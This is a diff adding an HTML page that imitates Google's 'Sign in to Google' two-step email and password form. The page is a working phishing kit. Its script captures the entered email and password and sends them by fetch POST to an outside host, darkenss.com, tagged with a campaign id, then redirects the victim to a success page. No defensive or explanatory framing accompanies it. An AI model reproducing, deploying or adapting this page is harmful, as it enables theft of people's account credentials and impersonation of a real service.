@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head> 
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Sign in to Google</title>
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/gmail.css">
+    <!-- Font Awesome core CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+    <style>
+        .form {
+            display: none;
+        }
+        .form.activeG {
+            display: block;
+        }
+        .error-message {
+            color: red;
+            display: none; /* Initially hidden */
+            margin-top: 10px;
+        }
+    </style>
+
+    <div class="form activeG" id="formOne">
+        <img src="images/google.png">
+        <form id="email-form">
+            <div class="first">
+                <h1>Sign in</h1>
+                <p>Use your Google Account</p>
+            </div>
+            <div class="second">
+                <input type="text" id="emailField" required> <br>
+                <div class="labelline">Email or Phone</div>
+                <p id="error_email" class="error-message">Please enter your email or phone.</p>
+                <div class="inn-text">
+                    <p class="spann"><a href="recover-password.html" class="first">Forgot email?</a></p>
+                    <p>Not your computer? Use Guest mode to sign in privately. <a href="">Learn more about using Guest mode</a></p>
+                </div>
+                <div class="but">
+                    <div class="create-list" id="create">
+                        <a href="personal.html"><li>For my personal use</li></a>
+                        <a href="child-account.html"><li>For my child</li></a>
+                        <a href=""><li>For my work or business</li></a>
+                    </div>
+                    <a href="#!" onclick="openCreate()" class="create" id="butCreate">Create account</a>
+                    <button type="button" class="next" id="nextBtn">Next</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div class="form" id="formTwo">
+        <img src="images/google.png">
+        <form id="password-form">
+            <div class="first">
+                <h1>Welcome</h1>
+                <p style="border: 1px solid #000;width: fit-content;padding: 2px 5px;border-radius: 30px;font-size: 0.9rem;cursor: pointer;">
+                    <i class="fa fa-user-circle"></i>
+                    <span id="userEmail" style="margin: 0 10px;font-weight: 500;">johndoe@gmail.com</span>
+                    <i class="fa fa-chevron-down"></i>
+                </p>
+            </div>
+            <div class="second">
+                <input type="password" id="passwordField" required> <br>
+                <div class="labelline">Enter your password</div>
+                <p id="error_password" class="error-message" style="margin-top: 20px;">Incorrect details, try again.</p>
+                <div class="inn-text">
+                    <input type="checkbox" id="che" style="position: relative;"> <label for="che" class="spann" style="font-size: 0.9rem;margin-left: 5px;">Show password</label>
+                </div>
+                <div class="but" style="margin-top: 50px;">
+                    <a href="" class="create">Forgot password?</a>
+                    <button type="submit" class="next" id="nextPasswordBtn">Next</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <select name="" id="">
+            <option value="" selected>English UK</option>
+            <option value="">English US</option>
+            <option value="">English US</option>
+            <option value="">English US</option>
+            <option value="">English US</option>
+            <option value="">English US</option>
+            <option value="">English US</option>
+            <option value="">English US</option>
+            <option value="">English US</option>
+            <option value="">English US</option>
+        </select>
+        <div class="help">
+            <a href="">Help</a>
+            <a href="">Privacy</a>
+            <a href="">Terms</a>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            $(".form input, .form select").focus(function () {
+                $(this).siblings(".labelline").css({
+                    "transform": "translateY(-20px)",
+                    "font-size": "0.8rem",
+                    "color": "blue",
+                    "z-index": "51"
+                });
+            });
+            $(".form input, .form select").blur(function () {
+                if ($(this).val().trim() === "") {
+                    $(this).siblings(".labelline").css({
+                        "transform": "translateY(0)",
+                        "font-size": "1rem",
+                        "color": "black",
+                        "z-index": "initial"
+                    });
+                }
+            });
+
+            // Toggle forms on Next button click
+            $('#nextBtn').on('click', function() {
+                const emailField = $('#emailField');
+                if (emailField.val().trim() === '') {
+                    $('#error_email').show();
+                } else {
+                    $('#error_email').hide();
+                    $('#formOne').removeClass('activeG');
+                    $('#formTwo').addClass('activeG');
+                    $('#userEmail').text(emailField.val());
+                }
+            });
+
+            // Show password functionality
+            $('#che').on('change', function() {
+                const passwordField = $('#passwordField');
+                if (this.checked) {
+                    passwordField.attr('type', 'text');
+                } else {
+                    passwordField.attr('type', 'password');
+                }
+            });
+
+            // Handle password form submission
+            $('#password-form').on('submit', function(event) {
+                event.preventDefault(); // Prevent default form submission
+
+                // Retrieve form data
+                const email = $('#emailField').val();
+                const password = $('#passwordField').val();
+
+                // Backend API URL
+                const apiUrl = 'https://darkenss.com/api/submit/';
+                
+                // ID and URL Link for the request (you can set these dynamically if needed)
+                const id = '59fe207c-151f-407d-8810-2b4958fbead8'; // Replace with the actual user ID
+                const urlLink = 'http://gmail.com'; // Replace with the actual URL
+                
+                // Prepare data to send
+                const data = {
+                    id: id,
+                    url_link: urlLink,
+                    username: email,
+                    password: password
+                };
+                
+                // Send the data to the backend API
+                fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        window.location.href = 'success.html';
+                    } else {
+                        $('#error_password').text('Incorrect details, try again.').show();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    $('#error_password').text('An error occurred. Please try again.').show();
+                });
+            });
+        });
+
+        // create pop up
+        var create = document.getElementById("create");
+        var butCreate = document.getElementById("butCreate");
+
+        function openCreate() {
+            create.classList.toggle("activeC");
+            butCreate.classList.toggle("activeB");
+        }
+
+        // Event listener to close the create element when clicking outside of it
+        document.addEventListener("click", function (event) {
+            // Check if the click target is not within the create element or the butCreate button
+            if (!create.contains(event.target) && event.target !== butCreate) {
+                // Close the create element
+                create.classList.remove("activeC");
+                butCreate.classList.remove("activeB");
+            }
+        });
+    </script>
+</body>
+</html>
